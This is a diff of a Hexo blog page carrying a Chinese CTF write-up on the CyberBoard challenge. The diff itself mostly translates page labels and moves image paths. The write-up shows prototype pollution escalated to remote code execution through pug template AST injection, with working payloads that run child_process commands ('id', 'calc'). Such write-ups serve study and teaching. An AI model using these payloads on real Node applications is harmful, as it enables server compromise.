@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang=zn>
+<html lang=en>
 <head>
     <!-- so meta -->
     <meta charset="utf-8">
@@ -12,17 +12,17 @@
 <meta property="og:url" content="https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="发现有原型链污染  但是没有模板注入  踩坑会不会在其他地方有模板注入，再去看看其他地方，无果 一点思路我们的污染Message类的原型，改变它的属性不能造成rce，所以我们的思路变成继续向上污染，通过污染Object类的原型来改变其他类的属性，从而造成rce。 AST注入结合pug模板，通过改变它的AST语法树，我们能够影响模板解析的js代码，从而rce可以看出这里的js字符串是直接当成命令执行">
-<meta property="og:locale">
-<meta property="og:image" content="https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/Pasted%20image%2020241128120257.png">
-<meta property="og:image" content="https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/Pasted%20image%2020241128120437.png">
-<meta property="og:image" content="https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/Pasted%20image%2020241128164924.png">
-<meta property="og:image" content="https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/Pasted%20image%2020241128165038.png">
-<meta property="og:image" content="https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/Pasted%20image%2020241128171817.png">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0wlle0n.github.io/images/Pasted%20image%2020241128120257.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/Pasted%20image%2020241128120437.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/Pasted%20image%2020241128164924.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/Pasted%20image%2020241128165038.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/Pasted%20image%2020241128171817.png">
 <meta property="article:published_time" content="2024-11-28T09:32:37.000Z">
-<meta property="article:modified_time" content="2024-11-28T09:49:01.341Z">
+<meta property="article:modified_time" content="2025-03-12T03:45:59.034Z">
 <meta property="article:author" content="le0n">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://0wlle0n.github.io/2024/11/28/%E5%BC%BA%E7%BD%91%E9%9D%92%E5%B0%91%E8%B5%9BCyberBoard%E5%A4%8D%E7%8E%B0wp/Pasted%20image%2020241128120257.png">
+<meta name="twitter:image" content="https://0wlle0n.github.io/images/Pasted%20image%2020241128120257.png">
     
     
       
@@ -66,18 +66,16 @@
 <body class="max-width mx-auto px3 ltr">
     
       <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
   <span id="menu">
     <span id="nav">
       <ul>
         <!--
-       --><li><a href="/">Inicio</a></li><!--
+       --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/about/">Acerca de</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Articulos</a></li><!--
+       --><li><a href="/about/">About</a></li><!--
      -->
       </ul>
     </span>
@@ -85,18 +83,16 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Post Anterior" href="/2024/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024webwp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
+        <li><a class="icon" aria-label="Next post" href="/2024/11/19/vm1%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E8%AF%A6%E8%A7%A3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
-        <li><a class="icon" aria-label="Post Siguiente" href="/2024/11/19/vm1%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E8%AF%A6%E8%A7%A3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Arriba" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Compartir Post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
-      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
-      <span id="i-next" class="info" style="display:none;">Post Siguiente</span>
-      <span id="i-top" class="info" style="display:none;">Arriba</span>
-      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
     </span>
     <br/>
     <div id="share" style="display: none">
@@ -158,17 +154,17 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="发现有原型链污染"><a href="#发现有原型链污染" class="headerlink" title="发现有原型链污染"></a>发现有原型链污染</h1><img src="Pasted image 20241128120257.png">
+    <h1 id="发现有原型链污染"><a href="#发现有原型链污染" class="headerlink" title="发现有原型链污染"></a>发现有原型链污染</h1><img src="/images/Pasted image 20241128120257.png">
 
-<h1 id="但是没有模板注入"><a href="#但是没有模板注入" class="headerlink" title="但是没有模板注入"></a>但是没有模板注入</h1><img src="Pasted image 20241128120437.png">
+<h1 id="但是没有模板注入"><a href="#但是没有模板注入" class="headerlink" title="但是没有模板注入"></a>但是没有模板注入</h1><img src="/images/Pasted image 20241128120437.png">
 
 <h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p>会不会在其他地方有模板注入，再去看看其他地方，无果</p>
 <h1 id="一点思路"><a href="#一点思路" class="headerlink" title="一点思路"></a>一点思路</h1><p>我们的污染Message类的原型，改变它的属性不能造成rce，所以我们的思路变成继续向上污染，通过污染Object类的原型来改变其他类的属性，从而造成rce。</p>
-<h1 id="AST注入"><a href="#AST注入" class="headerlink" title="AST注入"></a>AST注入</h1><p>结合pug模板，通过改变它的AST语法树，我们能够影响模板解析的js代码，从而rce<br>可以看出这里的js字符串是直接当成命令执行的<br><img src="Pasted image 20241128164924.png"><br><img src="Pasted image 20241128165038.png"></p>
+<h1 id="AST注入"><a href="#AST注入" class="headerlink" title="AST注入"></a>AST注入</h1><p>结合pug模板，通过改变它的AST语法树，我们能够影响模板解析的js代码，从而rce<br>可以看出这里的js字符串是直接当成命令执行的<br><img src="/images/Pasted image 20241128164924.png"><br><img src="/images/Pasted image 20241128165038.png"></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`function template(locals) &#123;var pug_html = &quot;&quot;, pug_mixins = &#123;&#125;, pug_interp;var pug_debug_filename, pug_debug_line;try &#123;;\n var locals_for_with = (locals || &#123;&#125;);\n \n (function (messages, user) &#123;\n ;pug_debug_line = 1;pug_debug_filename = &quot;C:\\\\Users\\\\leon\\\\Desktop\\\\src\\\\views\\\\layout.pug&quot;;\npug_html = pug_html + &quot;\\u003C!DOCTYPE html\\u003E&quot;;\n;pug_debug_line = 2;pug_debug_filename = &quot;C:\\\\Users\\\\leon\\\\Desktop\\\\src\\\\views\\\\layout.pug&quot;;\npug_html = pug_html + &quot;\\u003Chtml lang=\\&quot;en\\&quot;\\u003E&quot;;\n;p…ug_html = pug_html + &quot;\\u003Cscript src=\\&quot;\\u002Fjs\\u002Fmain.js\\&quot;\\u003E\\u003C\\u002Fscript\\u003E\\u003C\\u002Fbody\\u003E\\u003C\\u002Fhtml\\u003E&quot;;\n &#125;.call(this, &quot;messages&quot; in locals_for_with ?\n locals_for_with.messages :\n typeof messages !== &#x27;undefined&#x27; ? messages : undefined, &quot;user&quot; in locals_for_with ?\n locals_for_with.user :\n typeof user !== &#x27;undefined&#x27; ? user : undefined));\n ;&#125; catch (err) &#123;pug.rethrow(err, pug_debug_filename, pug_debug_line);&#125;;return pug_html;&#125;`</span></span><br></pre></td></tr></table></figure>
 <p>怎么控制js呢？</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;Code&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;While&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> (ast.<span class="property">block</span>) &#123; <span class="comment">// 注意这里</span></span><br><span class="line">            ast.<span class="property">block</span> = <span class="title function_">walkAST</span>(ast.<span class="property">block</span>, before, after, options);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
-<p>语法树中block会被递归解析<br><img src="Pasted image 20241128171817.png"><br>我们在pug_debug_line中插入要执行的代码，即让<br><code>Object.prototype.block = &#123;&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:`console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString())`&#125;;</code></p>
+<p>语法树中block会被递归解析<br><img src="/images/Pasted image 20241128171817.png"><br>我们在pug_debug_line中插入要执行的代码，即让<br><code>Object.prototype.block = &#123;&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:`console.log(process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString())`&#125;;</code></p>
 <p><code>Object.prototype.block = &#123;&quot;type&quot;:&quot;Text&quot;,&quot;line&quot;:&quot;process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)&quot;&#125;;</code></p>
 <p>所以最终我们的payload是</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=<span class="string">&quot;1&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;block&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Text&quot;</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
@@ -186,11 +182,9 @@
     <div id="nav-footer" style="display: none">
       <ul>
         
-          <li><a href="/">Inicio</a></li>
+          <li><a href="/">Home</a></li>
         
-          <li><a href="/about/">Acerca de</a></li>
-        
-          <li><a href="/archives/">Articulos</a></li>
+          <li><a href="/about/">About</a></li>
         
       </ul>
     </div>
@@ -224,7 +218,7 @@
         
           <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
 
@@ -237,18 +231,16 @@
     Copyright &copy;
     
     
-    2024-2025
+    2016-2025
     le0n
   </div>
   <div class="footer-right">
     <nav>
       <ul>
         <!--
-       --><li><a href="/">Inicio</a></li><!--
+       --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/about/">Acerca de</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Articulos</a></li><!--
+       --><li><a href="/about/">About</a></li><!--
      -->
       </ul>
     </nav>
@@ -278,7 +270,7 @@
   <script type="text/javascript">
   $(function() {
     // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"انسخ!\">";
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
     btn += '<i class="fa-regular fa-clone"></i>';
     btn += '</span>';
     // mount it!
@@ -289,7 +281,7 @@
       }
     });
     clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "تم النسخ!");
+      e.trigger.setAttribute('aria-label', "Copied!");
       e.clearSelection();
     })
   })
